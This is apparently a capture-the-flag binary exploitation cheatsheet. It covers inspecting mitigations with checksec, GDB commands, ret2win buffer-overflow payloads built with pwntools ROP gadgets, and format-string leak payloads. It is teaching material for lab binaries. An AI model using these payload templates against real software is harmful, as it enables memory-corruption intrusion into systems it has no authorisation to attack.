# Pwn Cheatsheet

## 1. Initial Binary Inspection
```bash
file ./vuln
checksec --file=./vuln
```

| Security Mitigation | Technical Meaning | Exploit Impact |
| :--- | :--- | :--- |
| **RELRO: Full** | Global Offset Table is read-only. | Cannot overwrite GOT entries. |
| **Stack Canary: No** | No stack integrity checks. | Direct buffer overflow possible. |
| **NX: Disabled** | Stack and heap memory are executable. | Shellcode can execute on stack. |
| **PIE: Disabled** | Binary loads at fixed base addresses. | Function and gadget addresses remain static. |

---

## 2. GDB Commands (pwndbg / GEF)
```bash
gdb ./vuln
```

Common debugger commands:
- `checksec`: Displays security mitigations.
- `info functions`: Lists all functions.
- `disas main`: Disassembles the main function.
- `b *main+40`: Sets breakpoint at specific offset.
- `r`: Runs the binary.
- `c`: Continues execution.
- `x/20gx $rsp`: Examines 20 64-bit words on the stack.
- `cyclic 100`: Generates pattern string.
- `cyclic -l <address>`: Calculates buffer offset to instruction pointer.

---

## 3. Ret2Win Attacks

### 32-bit Architecture
Arguments are passed on the stack:
```python
# Layout: [Padding] + [Function Address] + [Return Address] + [Arg1] + [Arg2]
payload = b"A" * offset + p32(win_addr) + p32(0x0) + p32(0xdeadbeef)
```

### 64-bit Architecture
Arguments are passed in registers (RDI, RSI, RDX, RCX, R8, R9):
```python
# Layout: [Padding] + [Ret Gadget] + [Pop RDI Gadget] + [Arg1] + [Function Address]
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(win_addr)
```

Note: If an exploit crashes inside `system()` at a `movaps` instruction, the stack is not 16-byte aligned. Prepend a single `ret` gadget to the payload to realign the stack.

---

## 4. Format String Vulnerabilities

When user input passes directly into a formatting function:
```c
printf(user_input);
```

### Leak Stack Values
```text
%p %p %p %p %p %p %p %p
```
Direct parameter access (example: 6th parameter):
```text
%6$p
```

### Leak String from Pointer
```text
%7$s
```
Reads data as a null-terminated string from the address pointed to by parameter 7.
